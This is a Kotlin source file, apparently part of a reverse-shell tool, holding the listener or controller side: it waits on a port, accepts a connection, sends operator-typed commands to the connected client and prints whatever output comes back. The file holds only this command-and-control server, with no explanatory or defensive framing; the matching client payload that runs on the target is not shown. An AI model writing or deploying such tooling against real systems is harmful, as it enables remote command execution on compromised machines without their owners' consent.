package reverseShell.server

import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintStream
import java.net.ServerSocket
import java.util.*

class Server {
    fun start(port: Int) {
        val server = ServerSocket(port)
        println("Listening on ${server.localPort}\nWaiting for client...")

        val client = server.accept()
        println("Client Accepted")

        val scanner = Scanner(System.`in`)
        val input = BufferedReader(InputStreamReader(client.getInputStream()))
        val output = PrintStream(client.getOutputStream())
        println("Input and Output streams established\n")

        var command: String?
        do {
            print("Enter command ('exit' to quit): ")
            command = scanner.nextLine()
            output.println(command)
            if (command != "exit") {
                println("Waiting for server response...")
                var line: String?
                while (input.readLine().also { line = it } != null) {
                    println(line)
                }
                println("Response complete")
            }
        } while (command != "exit")

        print("Exiting...")
        server.close()
    }
}
